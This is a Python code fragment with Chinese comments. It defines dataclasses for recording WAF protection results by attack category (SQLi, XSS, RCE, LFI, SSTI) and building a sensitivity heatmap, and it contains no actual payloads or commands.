@dataclass
class AttackVector:
    """单个攻击向量的测试定义"""
    dimension: str           # 攻击维度 (SQLi, XSS, RCE, LFI, SSTI)
    payloads: List[str]      # 测试 Payload 集合
    description: str = ""    # 维度描述


@dataclass
class DimensionResult:
    """单个维度的检测结果"""
    dimension: str
    total_probes: int = 0
    blocked_count: int = 0
    passed_count: int = 0
    block_rate: float = 0.0      # 拦截率 [0.0, 1.0]
    protection_level: str = ""   # 防护等级: 强/中/弱/无
    bypassed_payloads: List[str] = field(default_factory=list)  # 绕过的 Payload

    def to_dict(self) -> Dict[str, Any]:
        return {
            "dimension": self.dimension,
            "total_probes": self.total_probes,
            "blocked": self.blocked_count,
            "passed": self.passed_count,
            "block_rate": round(self.block_rate * 100, 1),
            "protection_level": self.protection_level,
            "bypassed_payloads": self.bypassed_payloads[:5],
        }


@dataclass
class WafHeatmap:
    """WAF 多维敏感度热力图"""
    waf_names: List[str] = field(default_factory=list)
    dimensions: List[DimensionResult] = field(default_factory=list)
    overall_score: float = 0.0        # 总体防护评分 [0.0, 100.0]
    weakest_dimension: str = ""       # 最薄弱维度
    strongest_dimension: str = ""     # 最强维度

    def to_dict(self) -> Dict[str, Any]:
        return {
            "waf_names": self.waf_names,
            "overall_score": round(self.overall_score, 1),
            "weakest_dimension": self.weakest_dimension,
            "strongest_dimension": self.strongest_dimension,
            "dimensions": [d.to_dict() for d in self.dimensions],
        }


